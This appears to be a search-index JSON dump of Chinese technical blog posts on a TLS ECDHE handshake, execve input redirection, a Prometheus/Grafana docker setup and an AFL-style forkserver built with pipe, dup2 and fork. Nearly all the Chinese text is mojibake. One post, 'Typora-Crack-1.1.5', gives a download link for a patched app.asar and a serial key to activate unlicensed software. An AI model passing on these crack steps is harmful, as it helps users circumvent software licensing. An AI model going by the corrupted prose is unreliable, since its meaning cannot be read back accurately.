æœ€ç»ˆçš„ä¼šè¯å¯†é’¥ï¼Œå°±æ˜¯ç”¨ã€Œå®¢æˆ·ç«¯éšæœºæ•° + æœåŠ¡ç«¯éšæœºæ•° + xï¼ˆECDHE ç®—æ³•ç®—å‡ºçš„å…±äº«å¯†é’¥ï¼‰ ã€ä¸‰ä¸ªææ–™ç”Ÿæˆçš„ã€‚ ä¹‹æ‰€ä»¥è¿™ä¹ˆéº»çƒ¦ï¼Œæ˜¯å› ä¸º TLS è®¾è®¡è€…ä¸ä¿¡ä»»å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ã€Œä¼ªéšæœºæ•°ã€çš„å¯é æ€§ï¼Œä¸ºäº†ä¿è¯çœŸæ­£çš„å®Œå…¨éšæœºï¼ŒæŠŠä¸‰ä¸ªä¸å¯é çš„éšæœºæ•°æ··åˆèµ·æ¥ï¼Œé‚£ä¹ˆã€Œéšæœºã€çš„ç¨‹åº¦å°±éå¸¸é«˜äº†ï¼Œè¶³å¤Ÿè®©é»‘å®¢è®¡ç®—å‡ºæœ€ç»ˆçš„ä¼šè¯å¯†é’¥ï¼Œå®‰å…¨æ€§æ›´é«˜ã€‚ ç®—å¥½ä¼šè¯å¯†é’¥åï¼Œå®¢æˆ·ç«¯ä¼šå‘ä¸€ä¸ªã€ŒChange Cipher Specã€æ¶ˆæ¯ï¼Œå‘Šè¯‰æœåŠ¡ç«¯åç»­æ”¹ç”¨å¯¹ç§°ç®—æ³•åŠ å¯†é€šä¿¡ã€‚ æ¥ç€ï¼Œå®¢æˆ·ç«¯ä¼šå‘ã€ŒEncrypted Handshake Messageã€æ¶ˆæ¯ï¼ŒæŠŠä¹‹å‰å‘é€çš„æ•°æ®åšä¸€ä¸ªæ‘˜è¦ï¼Œå†ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†ä¸€ä¸‹ï¼Œè®©æœåŠ¡ç«¯åšä¸ªéªŒè¯ï¼ŒéªŒè¯ä¸‹æœ¬æ¬¡ç”Ÿæˆçš„å¯¹ç§°å¯†é’¥æ˜¯å¦å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ TLS ç¬¬å››æ¬¡æ¡æ‰‹ æœ€åï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šæœ‰ä¸€ä¸ªåŒæ ·çš„æ“ä½œï¼Œå‘ã€ŒChange Cipher Specã€å’Œã€ŒEncrypted Handshake Messageã€æ¶ˆæ¯ï¼Œå¦‚æœåŒæ–¹éƒ½éªŒè¯åŠ å¯†å’Œè§£å¯†æ²¡é—®é¢˜ï¼Œé‚£ä¹ˆæ¡æ‰‹æ­£å¼å®Œæˆã€‚äºæ˜¯ï¼Œå°±å¯ä»¥æ­£å¸¸æ”¶å‘åŠ å¯†çš„ HTTP è¯·æ±‚å’Œå“åº”äº†ã€‚ æ€»ç»“ RSA å’Œ ECDHE æ¡æ‰‹è¿‡ç¨‹çš„åŒºåˆ«ï¼š RSA å¯†é’¥åå•†ç®—æ³•ã€Œä¸æ”¯æŒã€å‰å‘ä¿å¯†ï¼ŒECDHE å¯†é’¥åå•†ç®—æ³•ã€Œæ”¯æŒã€å‰å‘ä¿å¯†ï¼› ä½¿ç”¨äº† RSA å¯†é’¥åå•†ç®—æ³•ï¼ŒTLS å®Œæˆå››æ¬¡æ¡æ‰‹åï¼Œæ‰èƒ½è¿›è¡Œåº”ç”¨æ•°æ®ä¼ è¾“ï¼Œè€Œå¯¹äº ECDHE ç®—æ³•ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä¸ç”¨ç­‰æœåŠ¡ç«¯çš„æœ€åä¸€æ¬¡ TLS æ¡æ‰‹ï¼Œå°±å¯ä»¥æå‰å‘å‡ºåŠ å¯†çš„ HTTP æ•°æ®ï¼ŒèŠ‚çœäº†ä¸€ä¸ªæ¶ˆæ¯çš„å¾€è¿”æ—¶é—´ï¼› ä½¿ç”¨ ECDHEï¼Œ åœ¨ TLS ç¬¬ 2 æ¬¡æ¡æ‰‹ä¸­ï¼Œä¼šå‡ºç°æœåŠ¡å™¨ç«¯å‘å‡ºçš„ã€ŒServer Key Exchangeã€æ¶ˆæ¯ï¼Œè€Œ RSA æ¡æ‰‹è¿‡ç¨‹æ²¡æœ‰è¯¥æ¶ˆæ¯ï¼› åŸæ–‡ï¼šhttps://www.cnblogs.com/xiaolincoding/p/14318338.html","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"ECDHE","slug":"ECDHE","permalink":"https://www.sizaif.com/tags/ECDHE/"},{"name":"å¯†é’¥åå•†","slug":"å¯†é’¥åå•†","permalink":"https://www.sizaif.com/tags/%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86/"}],"author":"sizaif"},{"title":"Execve æ‰§è¡Œé‡åˆ°çš„é—®é¢˜","slug":"execve-æ‰§è¡Œé‡åˆ°çš„é—®é¢˜","date":"2022-07-13T16:14:08.000Z","updated":"2022-11-07T02:17:20.289Z","comments":true,"path":"posts/2a91f3eb/","link":"","permalink":"https://www.sizaif.com/posts/2a91f3eb/","excerpt":"","text":"ä¸€æ®µå¾ˆç®€å•çš„C++ä»£ç ï¼Œ è¾“å…¥aï¼Œb è¾“å‡ºa/bï¼› æµ‹è¯•ä»£ç å¦‚ä¸‹ /*** * @ _oo0oo_ * @ o8888888o * @ 88\" . \"88 * @ (| -_- |) * @ 0\\ = /0 * @ ___/`---'\\___ * @ .' \\\\| |// '. * @ / \\\\||| : |||// \\ * @ / _||||| -:- |||||- \\ * @ | | \\\\\\ - /// | | * @ | \\_| ''\\---/'' |_/ | * @ \\ .-\\__ '-' ___/-. / * @ ___'. .' /--.--\\ `. .'___ * @ .\"\" '&lt; `.___\\_&lt;|>_/___.' >' \"\". * @ | | : `- \\`.;`\\ _ /`;.`/ - ` : | | * @ \\ \\ `_. \\_ __\\ /__ _/ .-` / / * @ =====`-.____`.___ \\_____/___.-`___.-'===== * @ `=---=' * @ * @ * @ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ * @ * @ ä½›ç¥–ä¿ä½‘ æ°¸ä¸å®•æœº æ°¸æ— BUG * @ * @ */ # 2.cpp #include &lt;iostream> #include &lt;stdlib.h> using namespace std; int main(int argc,char *argv[])&#123; int a,b; int len = argc; cout&lt;&lt;\"argv[0] :\"&lt;&lt;argv[0]&lt;&lt;endl; cout&lt;&lt;\"input a and b\"&lt;&lt;endl; cin>>a>>b; cout&lt;&lt;\"a : \"&lt;&lt;a&lt;&lt;\" b is \"&lt;&lt;b&lt;&lt;endl; cout&lt;&lt;\"a/b is :\"&lt;&lt;a/b&lt;&lt;endl; return 0; &#125; ç›´æ¥æ‰§è¡Œè‚¯å®šæ˜¯æ²¡é—®é¢˜çš„ï¼Œ ä½†æ˜¯å½“æˆ‘æƒ³forkä¸€ä¸ªå­è¿›ç¨‹é€šè¿‡execvè¿›è¡Œè°ƒç”¨çš„æ—¶å€™ï¼Œ ä¼šå‡ºç°å†…å­˜è¶Šç•Œè¯»çš„é—®é¢˜ å¦‚ä¸‹é”™è¯¯ï¼š root@0187031113b5:/work05# ./test.ccc root@0187031113b5:/work05# argv[0] :/work05/2.out input a and b a : -1422482224 b is 537128240 a/b is :-2 execve fork çš„ä»£ç å¦‚ä¸‹ï¼š #test.cpp #2.out ä¸ºä¸Šè¿°a/bä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶ int main()&#123; int chid = fork(); if(chid &lt;0)&#123; PFATAL(\"fork error\"); &#125;else if(!chid)&#123; std::string tp = \"&lt;path to >/2.out\"; char * a_argv[] = &#123;strdup(tp.c_str()),nullptr&#125;; char *envp[] = &#123;&#125;; execve(a_argv[0],a_argv,envp); &#125; return 0; &#125; å½“æˆ‘å°è¯•å°†a_argv[] ä¿®æ”¹å¦‚ä¸‹æ—¶ char * a_argv[] = &#123;strdup(tp.c_str())&#125;; execveæœªæ­£ç¡®æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾æ•ˆæœ è§£å†³æ–¹å¼ å½“æˆ‘ä»¬æƒ³ä½¿ç”¨fork+execvä»¥åŠstdinæ—¶ï¼Œ åº”è¯¥ä½¿ç”¨dup2 æ–‡ä»¶é‡å®šå‘å‡½æ•°,å°†è¾“å…¥in.txtç­‰æ–‡ä»¶å†…å®¹ä½œä¸º` STDIN_FILEN /* Standard file descriptors. */ #define STDIN_FILENO 0 /* Standard input. */ #define STDOUT_FILENO 1 /* Standard output. */ #define STDERR_FILENO 2 /* Standard error output. */ æ­£ç¡®çš„æ–¹å¼å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š int main()&#123; int status; std::string fcur = \"&lt;path to input>/.cur_input\"; int fd = open(fcur.c_str(),O_RDONLY); int chid = fork(); if(chid &lt;0)&#123; PFATAL(\"fork error\"); &#125;else if(!chid)&#123; /* Child */ std::string tp = \"&lt;path to >/2.out\"; std::vector&lt;std::string> vt; vt.push_back(tp); dup2(fd,STDIN_FILENO); close(fd); char * a_argv[] = &#123;strdup(tp.c_str()),nullptr&#125;; char *envp[] = &#123;&#125;; execv(a_argv[0],a_argv); &#125; /* Parents*/ wait(&amp;status); close(fd);","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.sizaif.com/tags/linux/"},{"name":"execv","slug":"execv","permalink":"https://www.sizaif.com/tags/execv/"}],"author":"sizaif"},{"title":"Prometheus+Grafana æ•°æ®å¯è§†åŒ–","slug":"Prometheus-Grafana-æ•°æ®å¯è§†åŒ–","date":"2022-07-12T04:59:37.000Z","updated":"2022-07-12T05:00:48.105Z","comments":true,"path":"posts/3c3b772/","link":"","permalink":"https://www.sizaif.com/posts/3c3b772/","excerpt":"","text":"Prometheus + Grafana è¿è¡Œæ•°æ®å¯è§†åŒ– @2022-07-12 11:19:16 @sizaif @æ¶‰åŠçŸ¥è¯†ï¼š docker å®¹å™¨é—´é€šä¿¡ docker compose ç”¨æ³• æ•°æ®ç¼–ç æ ¼å¼ éœ€æ±‚ åŸå…ˆæ•ˆæœå¦‚ä¸‹ï¼š å°†è¿è¡Œçš„æ‰§è¡Œæ•°æ®å¯è§†åŒ–å æ•ˆæœå¦‚ä¸‹ï¼š å‰æå‡†å¤‡ é‡‡ç”¨dockerçš„æ–¹å¼ grafana statsd_exporter prometheus å®¿ä¸»æœºä¸ºWindowsç¯å¢ƒ æ¶æ„å›¾å¦‚ä¸‹ï¼š è¯´æ˜ï¼š fuzzç¨‹åºï¼Œgrafanaï¼Œstatsd_exporterï¼Œprometheus éƒ½åœ¨dockerå®¹å™¨ä¸­ï¼Œæ¶‰åŠåˆ°å®¹å™¨é—´é€šä¿¡ ç«¯å£æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š IMAGE PORTS NAMES grafana/grafana 0.0.0.0:3000-&gt;3000/tcp grafana prom/statsd-exporter 0.0.0.0:9102-&gt;9102/tcp, 9125/tcp, 0.0.0.0:8125-&gt;9125/udp statsd_exporter prom/prometheus 0.0.0.0:9090-&gt;9090/tcp prometheus é‡‡ç”¨docker compose åˆ›å»ºä¸€ä¸ªä»¥æ¡¥æ¥æ–¹å¼çš„statsd-netç½‘ç»œï¼Œ æ­¤æ—¶docker composeå†…çš„å®¹å™¨å¯é€šè¿‡å®¹å™¨name+portè¿›è¡Œé€šä¿¡ ä¾‹å¦‚ï¼špromethesè·å–statsd-exporterä¸­çš„æ•°æ® åªéœ€ç”¨getè·å–http://statsd-exporter:9102 å³å¯è·å– statsd-netç½‘ç»œä¸­çš„æŸä¸ªå®¹å™¨çš„ipæ®µå¦‚ä¸‹ï¼š 172.18.0.2-172.18.0.4 \"Networks\": &#123; \"docker-compose_statsd-net\": &#123; Â·Â·Â·Â·Â· \"Gateway\": \"172.18.0.1\", \"IPAddress\": \"172.18.0.2\", Â·Â·Â·Â·Â· &#125; &#125; æ­¤æ—¶è‹¥statsd-netç½‘ç»œå¤–çš„å®¹å™¨æƒ³ä¸ç½‘ç»œå†…çš„å®¹å™¨è¿›è¡Œé€šä¿¡åªéœ€å°†å…¶åŠ å…¥åˆ°statsd-netç½‘ç»œå³å¯[1] [1] æ­¤å¤„å‚è€ƒï¼š https://zhuanlan.zhihu.com/p/429276977 æ‰§è¡Œï¼š docker network connect statsd-net &lt;container ID&gt; æ‰§è¡Œåçš„ipå¦‚ä¸‹æ‰€ç¤ºï¼š \"Networks\": &#123; \"bridge\": &#123; Â·Â·Â·Â·Â· \"Gateway\": \"172.17.0.1\", \"IPAddress\": \"172.17.0.2\", Â·Â·Â·Â·Â· &#125;, \"docker-compose_statsd-net\": &#123; Â·Â·Â·Â·Â· \"Gateway\": \"172.18.0.1\", \"IPAddress\": \"172.18.0.5\", Â·Â·Â·Â·Â· &#125; &#125; &#125; æ­¤æ—¶æ‰€æœ‰å®¹å™¨å¯ç›¸äº’é€šä¿¡ æ­¥éª¤ docker éƒ¨åˆ† åˆ›å»ºdocker-compose.ymlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ version: '3' networks: statsd-net: driver: bridge services: prometheus: image: prom/prometheus container_name: prometheus volumes: - ./prometheus.yml:/prometheus.yml command: - '--config.file=/prometheus.yml' restart: unless-stopped ports: - \"9090:9090\" networks: - statsd-net statsd_exporter: image: prom/statsd-exporter container_name: statsd_exporter volumes: - ./statsd_mapping.yml:/statsd_mapping.yml command: - \"--statsd.mapping-config=/statsd_mapping.yml\" ports: - \"9102:9102/tcp\" - \"8125:9125/udp\" networks: - statsd-net grafana: image: grafana/grafana container_name: grafana restart: unless-stopped ports: - \"3000:3000\" networks: - statsd-net åˆ›å»º prometheus.yml æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ global: scrape_interval: 15s evaluation_interval: 15s scrape_configs: - job_name: 'fuzzing_metrics' static_configs: - targets: ['statsd_exporter:9102'] Create a statsd_mapping.yml containing the following: mappings: - match: \"fuzzing.*\" name: \"fuzzing\" labels: type: \"$1\" ç›®å½•å¦‚ä¸‹ï¼š æ‰§è¡Œdocker compose up -då‘½ä»¤ åå°ç®¡ç† ç™»å½•prometheusåï¼Œ ï¼ˆlocalhost:9090) targets ä¸­çŠ¶æ€ä¸ºup ç™»å½•Grafanaåå° (localhost:3000) user:admin , pwd: admin **è®¾ç½®æ•°æ®æº** URLä¸ºï¼š `http://Prometheus:9090` ![image-20220712120444022](https://s2.loli.net/2022/07/12/T4JcEnZyQmo6qXH.png) æ•°æ®å‘é€StatSD ç¼–å†™å‘é€.cpp ä½¿ç”¨socketé€šä¿¡ï¼Œ portä¸º:8125 (æ­¤å¤„ç«¯å£ä¸ºstatsd_exporteræ˜ å°„çš„udpæ¥æ”¶ç«¯ç«¯å£) hostä¸ºï¼š statsd-exporter, dockerä¼šè‡ªåŠ¨è¿›è¡Œipè½¬æ¢ StatSDæ•°æ®æ ¼å¼ï¼š å‚è€ƒï¼š https://registry.hub.docker.com/r/prom/statsd-exporter https://docs.datadoghq.com/developers/dogstatsd/datagram_shell/?tabs=metrics DogStatsD: metric.name:&lt;value>|&lt;type>|#key:value,key2:value2 InfluxDB metric.name,key=value,key2=value2:&lt;value>|&lt;type> Librato metric.name#key=value,key2=value2:&lt;value>|&lt;type> SignalFX metric.name[key=value,key2=value2]:&lt;value>|&lt;type>","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"æ ‡ç­¾äºŒ","slug":"æ ‡ç­¾äºŒ","permalink":"https://www.sizaif.com/tags/%E6%A0%87%E7%AD%BE%E4%BA%8C/"},{"name":"docker","slug":"docker","permalink":"https://www.sizaif.com/tags/docker/"}],"author":"sizaif"},{"title":"Typora-Crack-1.1.5","slug":"typora-crack-1-1-5","date":"2022-06-15T07:23:40.000Z","updated":"2022-07-13T16:15:44.709Z","comments":true,"path":"posts/54edf84f/","link":"","permalink":"https://www.sizaif.com/posts/54edf84f/","excerpt":"","text":"ä¸‹è½½é“¾æ¥ï¼š https://mega.nz/file/huZ2BQwQ#Wluvf9wh73J1h0g058Ey2P9EswmKgOubLTHBgwZAgJ8 æˆ– RSPT é€‚ç”¨æ–¹æ³• å®‰è£…æ—¶è®°å¾— typoraçš„å®‰è£…ç›®å½• 1. å®‰è£…å®Œæˆåï¼Œ æ‰“å¼€typoraï¼Œ ç‚¹å‡»15å¤©è¯•ç”¨ 2. å¤åˆ¶app.asar æ›¿æ¢åˆ°typoraçš„å®‰è£…ç›®å½•ä¸‹çš„resourcesæ–‡ä»¶å¤¹ä¸­ 3. æ‰“å¼€typora è¿›è¡Œæ¿€æ´» e-mail éšä¾¿å†™@ åºåˆ—å·ï¼šJCEKRV-4V7ZSU-PSQKQ7-G2NT2Q","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"typora","slug":"typora","permalink":"https://www.sizaif.com/tags/typora/"}],"author":"sizaif"},{"title":"Pipeä¸dup2ä¸forkå¦™ç”¨","slug":"pipeä¸dup2ä¸forkå¦™ç”¨","date":"2022-06-02T06:31:23.000Z","updated":"2022-06-15T07:31:30.839Z","comments":true,"path":"posts/8838784f/","link":"","permalink":"https://www.sizaif.com/posts/8838784f/","excerpt":"","text":"æ¡†æ¶ï¼š dup2 pipe ä¸fork ä¸€åŒä½¿ç”¨ï¼Œå…¶æ¡†æ¶å¦‚ä¸‹ï¼š æ€è·¯ï¼š çˆ¶è¿›ç¨‹ï¼š å…³é—­ctl_pipe[0] è¯»ç«¯, è·å–st_pipe[0] å­è¿›ç¨‹ä¸­è°ƒç”¨execvçš„çŠ¶æ€-&gt; å³ forkserveræ˜¯å¦å‡†å¤‡å¥½ å†™å…¥ctl_pipe[1] é€šçŸ¥å­è¿›ç¨‹fuzz è¿›è¡Œä¸€ä¸ªfork å­è¿›ç¨‹ï¼š å…³é—­st_pipe[0] è¯»ç«¯ï¼Œè·å–ctl_pipe[1] æ¥æ”¶æ¥è‡ªçˆ¶è¿›ç¨‹çš„å‘½ä»¤ï¼Œå¼€å¯ä¸€ä¸ªfork å†™å…¥st_pipe[1] ï¼Œ é€šçŸ¥çˆ¶è¿›ç¨‹forkserverå‡†å¤‡å¥½ï¼Œå¹¶è¿›å…¥loopå¾ªç¯ å­è¿›ç¨‹è¯¦ç»†æè¿°å¦‚ä¸‹ï¼š è°ƒç”¨execvä¹‹å‰ï¼š é‡å®šå‘FORKSRV_FDåˆ°ctl_pipe[0],é‡å®šå‘FORKSRV_FD + 1åˆ°st_pipe[1] 1. å­è¿›ç¨‹åªèƒ½è¯»å–å‘½ä»¤ 2. å­è¿›ç¨‹åªèƒ½å‘é€(â€œå†™å‡ºâ€)çŠ¶æ€ å…³é—­å­è¿›ç¨‹é‡Œçš„ä¸€äº›æ–‡ä»¶æè¿°ç¬¦ execv(target_path, argv)å¸¦å‚æ•°æ‰§è¡Œtarget ç¬¬ä¸€ä¸ªtargetä¼šè¿›å…¥_fn_start_forkserver_loopï¼Œå¹¶å……å½“fork serverï¼Œåœ¨æ•´ä¸ªFuzzçš„è¿‡ç¨‹ä¸­ï¼Œå®ƒéƒ½ä¸ä¼šç»“æŸï¼Œæ¯æ¬¡è¦Fuzzä¸€æ¬¡targetï¼Œéƒ½ä¼šä»è¿™ä¸ªfork server forkå‡ºæ¥ä¸€ä¸ªå­è¿›ç¨‹å»fuzzã€‚ execv: targetç›®æ ‡ä¸­_fn_start_forkserver: é¦–å…ˆè®¾ç½®child_stoppedä¸º0ï¼Œç„¶åé€šè¿‡FORKSRV_FD + 1å‘çŠ¶æ€ç®¡é“å†™å…¥4ä¸ªå­—èŠ‚ï¼Œå‘ŠçŸ¥fuzzçˆ¶è¿›ç¨‹å·²ç»å‡†å¤‡å¥½äº†ã€‚ ç„¶åè¿›å…¥fuzz loopå¾ªç¯ é€šè¿‡readä»æ§åˆ¶ç®¡é“FORKSRV_FDè¯»å–4ä¸ªå­—èŠ‚ï¼Œå¦‚æœå½“å‰ç®¡é“ä¸­æ²¡æœ‰å†…å®¹ï¼Œå°±ä¼šå µå¡åœ¨è¿™é‡Œï¼Œå¦‚æœè¯»åˆ°äº†ï¼Œå°±ä»£è¡¨fuzzçˆ¶è¿›ç¨‹å‘½ä»¤æˆ‘ä»¬fork serverå»æ‰§è¡Œä¸€æ¬¡fuzz å¦‚æœchild_stoppedä¸º0 : åˆ™ç›´æ¥forkå‡ºä¸€ä¸ªå­è¿›ç¨‹å»è¿›è¡Œfuzzç„¶åæ­¤æ—¶å¯¹äºå­è¿›ç¨‹å°±ä¼šå…³é—­å’Œæ§åˆ¶ç®¡é“å’ŒçŠ¶æ€ç®¡é“ç›¸å…³çš„fdï¼Œç„¶åreturnè·³å‡ºfuzz loopï¼Œæ¢å¤æ­£å¸¸æ‰§è¡Œã€‚ å¦‚æœchild_stoppedä¸º1ï¼Œè¿™æ˜¯å¯¹äºpersistent modeçš„ç‰¹æ®Šå¤„ç†ï¼Œæ­¤æ—¶å­è¿›ç¨‹è¿˜æ´»ç€ï¼Œåªæ˜¯è¢«æš‚åœäº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡kill(child_pid, SIGCONT)æ¥ç®€å•çš„é‡å¯ï¼Œç„¶åè®¾ç½®child_stoppedä¸º0ã€‚ ç„¶åfork serverå‘çŠ¶æ€ç®¡é“FORKSRV_FD + 1å†™å…¥å­è¿›ç¨‹çš„pidï¼Œç„¶åç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œæ³¨æ„è¿™é‡Œå¯¹äºpersistent modeï¼Œæˆ‘ä»¬ä¼šè®¾ç½®waitpidçš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºWUNTRACEDï¼Œä»£è¡¨è‹¥å­è¿›ç¨‹è¿›å…¥æš‚åœçŠ¶æ€ï¼Œåˆ™é©¬ä¸Šè¿”å›ã€‚ WIFSTOPPED(status)å®ç¡®å®šè¿”å›å€¼æ˜¯å¦å¯¹åº”äºä¸€ä¸ªæš‚åœå­è¿›ç¨‹ï¼Œå› ä¸ºåœ¨persistent modeé‡Œå­è¿›ç¨‹ä¼šé€šè¿‡SIGSTOPä¿¡å·æ¥æš‚åœè‡ªå·±ï¼Œå¹¶ä»¥æ­¤æŒ‡ç¤ºè¿è¡ŒæˆåŠŸï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å†è¿›è¡Œä¸€æ¬¡fuzzï¼Œå°±åªéœ€è¦å’Œä¸Šé¢ä¸€æ ·ï¼Œé€šè¿‡SIGCONTä¿¡å·æ¥å”¤é†’å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œå³å¯ï¼Œä¸éœ€è¦å†è¿›è¡Œä¸€æ¬¡fuzzã€‚ è®¾ç½®child_stoppedä¸º1ã€‚ å½“å­è¿›ç¨‹ç»“æŸä»¥åï¼Œå‘çŠ¶æ€ç®¡é“FORKSRV_FD + 1å†™å…¥4ä¸ªå­—èŠ‚ï¼Œé€šçŸ¥fuzzçˆ¶è¿›ç¨‹è¿™æ¬¡targetæ‰§è¡Œç»“æŸäº†ã€‚ çˆ¶è¿›ç¨‹è¯¦ç»†æè¿°å¦‚ä¸‹ï¼š å…³é—­ä¸éœ€è¦çš„endpoints close(ctl_pipe[0]); close(st_pipe[1]); fsrv_ctl_fd = ctl_pipe[1];//çˆ¶è¿›ç¨‹åªèƒ½å‘é€(\"å†™å‡º\")å‘½ä»¤ fsrv_st_fd = st_pipe[0];//çˆ¶è¿›ç¨‹åªèƒ½è¯»å–çŠ¶æ€ ç­‰å¾…fork serverå¯åŠ¨ï¼Œä½†æ˜¯ä¸èƒ½ç­‰å¤ªä¹… ä»ç®¡é“é‡Œè¯»å–4ä¸ªå­—èŠ‚åˆ°statusé‡Œï¼Œå¦‚æœè¯»å–æˆåŠŸï¼Œåˆ™ä»£è¡¨fork serveræˆåŠŸå¯åŠ¨ï¼Œå°±ç»“æŸè¿™ä¸ªå‡½æ•°å¹¶è¿”å›ã€‚ å¦‚æœè¶…æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚ å­è¿›ç¨‹å¯åŠ¨å¼‚å¸¸å¤„ç† æºç ï¼š å¼€å¯ç®¡é“ï¼š int st_pipe[2], ctl_pipe[2]; /* = 0 success */ if( pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(\"pipe() failed\"); å­è¿›ç¨‹ï¼š if (!forksrv_pid ) &#123; ACTF(\"[%d:/child] child \",__LINE__); /* cid code */ setsid(); close(ctl_pipe[1]); /* å…³é—­ctl å†™ç«¯ */ close(st_pipe[0]); /* å…³é—­st è¯»ç«¯ */ if (dup2(ctl_pipe[0], FORKSRV_FD) &lt; 0) PFATAL(\"dup2() failed\"); if (dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0) PFATAL(\"dup2() failed\"); ACTF(\"[%d:/child] start to execv %s\",__LINE__,target_path.c_str()); execv(target_path.c_str(), argv); &#125; çˆ¶è¿›ç¨‹ï¼š /* fpid code */ ACTF(\"[%d:/parent] start to parent \",__LINE__); close(ctl_pipe[0]); /* close read */ close(st_pipe[1]); /* close write */ fsrv_ctl_fd = ctl_pipe[1]; /* write */ fsrv_st_fd = st_pipe[0]; /* read */ /* Wait for the fork server to come up, but don't wait too long. */ it.it_value.tv_sec = ((exec_tmout * 100*FORK_WAIT_MULT)/1000); it.it_value.tv_usec = ((exec_tmout * 100*FORK_WAIT_MULT) % 1000) * 1000; setitimer(ITIMER_REAL,&amp;it,NULL); rlen = read(fsrv_st_fd,&amp;status,4); ACTF(\"[%d:/parent] rlen = : %d \\n\",__LINE__,rlen); it.it_value.tv_sec = 0; it.it_value.tv_usec = 0; setitimer(ITIMER_REAL, &amp;it, NULL); if (rlen == 4) &#123; OKF(\"[%d:/parent] All right - fork server is up.\",__LINE__); return; &#125; FATAL(\"[%d:/parent] Fork server handshake failed\",__LINE__); **execv:**ä¸­ static void _fn_start_forkserver(void)&#123; static u8 tmp[4]; i32 child_pid; u8 child_stopped = 0; if (write(FORKSRV_FD + 1, tmp, 4) != 4) &#123; PFATAL(\"write FORKSRV_FD+1 !=4 %d\",__LINE__); return; &#125; OKF(\"[%d:/execv] Fuzz I am ready\\n\",__LINE__); while(1)&#123; OKF(\"[%d:/execv] _fn_forkserver_loop ....\",__LINE__); u32 was_killed; i32 status; /* Wait for parent by reading from the pipe. Abort if read fails. */ if (read(FORKSRV_FD, &amp;was_killed, 4) != 4)&#123; // PFATAL(\"abort read fails %d\",__LINE__); _exit(1); &#125; /* If we stopped the child in persistent mode, but there was a race condition and afl-fuzz already issued SIGKILL, write off the old process. */ if(child_stopped &amp;&amp; was_killed )&#123; child_stopped = 0; if (waitpid(child_pid, &amp;status, 0) &lt; 0)&#123; PFATAL(\"write off the old process. %d\",__LINE__); _exit(1); &#125; &#125; OKF(\"[%d:/execv] ....\",__LINE__); if(!child_stopped)&#123; OKF(\"[%d:/execv] start a child pid \",__LINE__); /* Once woken up, create a clone of our process. */ child_pid = fork(); if (child_pid &lt; 0) _exit(1); /* In child process: close fds, resume execution. */ if(!child_pid)&#123; OKF(\"[%d:/execv] close FORKSRV_FD &amp; FORKSRV_FD+1\",__LINE__); close(FORKSRV_FD); close(FORKSRV_FD + 1); return; &#125; &#125;else&#123; /* Special handling for persistent mode: if the child is alive but currently stopped, simply restart it with SIGCONT. */ OKF(\"[%d:/execv] kill child_pid\",__LINE__); kill(child_pid, SIGCONT); child_stopped = 0; &#125; OKF(\"[%d:/execv] ....\",__LINE__); /* In parent process: write PID to pipe, then wait for child. */ if (write(FORKSRV_FD + 1, &amp;child_pid, 4) != 4)&#123; _exit(1); &#125; if (waitpid(child_pid, &amp;status, is_persistent ? WUNTRACED : 0) &lt; 0) &#123; _exit(1); &#125; /* In persistent mode, the child stops itself with SIGSTOP to indicate a successful run. In this case, we want to wake it up without forking again. */ if (WIFSTOPPED(status)) child_stopped = 1; /* Relay wait status to pipe, then loop back. */ if (write(FORKSRV_FD + 1, &amp;status, 4) != 4) _exit(1); &#125; 